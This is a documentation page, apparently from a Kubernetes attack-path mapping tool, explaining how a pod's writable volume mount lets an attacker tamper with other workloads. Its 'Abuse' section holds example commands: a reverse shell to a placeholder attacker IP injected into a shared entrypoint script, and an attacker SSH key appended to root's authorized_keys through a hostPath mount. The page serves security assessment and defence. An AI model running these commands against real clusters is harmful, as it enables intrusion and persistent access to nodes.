# CH_hasWriteVolume

## Edge Schema

- **Source:** [CH_Pod](../NodeDescriptions/CH_Pod.md)
- **Target:** [CH_Volume](../NodeDescriptions/CH_Volume.md)

## General Information

The Pod has a write-capable mount of the target Volume, potentially allowing modification of data, configuration, or binaries accessible to other workloads. Edge property `containername` identifies which container holds the mount.

## Abuse

Write to the mounted volume to affect other workloads that share it. The impact depends on whether another pod reads from or executes the content; a write to an unused volume is harmless. Most valuable against shared PVCs, ConfigMap-backed mounts consumed by other workloads, and hostPath mounts where writes go directly to the node filesystem. The `containername` edge property identifies which container holds the mount.

```bash
# Inject a reverse shell into a script executed by another workload
echo 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1' >> /path/to/mount/entrypoint.sh

# Modify a configuration file consumed by another pod
echo 'malicious_setting: true' >> /path/to/mount/config.yaml

# On a host path mount, write to the node filesystem
echo '<attacker-key>' >> /path/to/mount/root/.ssh/authorized_keys
```

## References

- [Kubernetes Volumes](https://kubernetes.io/docs/concepts/storage/volumes/)
- [HackTricks - Kubernetes Writable hostPath](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/escaping-from-kubernetes/kubernetes-host-path-mount-escape)
- [OWASP K01 - Insecure Workload Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K01-Insecure-Workload-Configurations.html)
- [Threat Matrix - Writable hostPath Mount](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/)
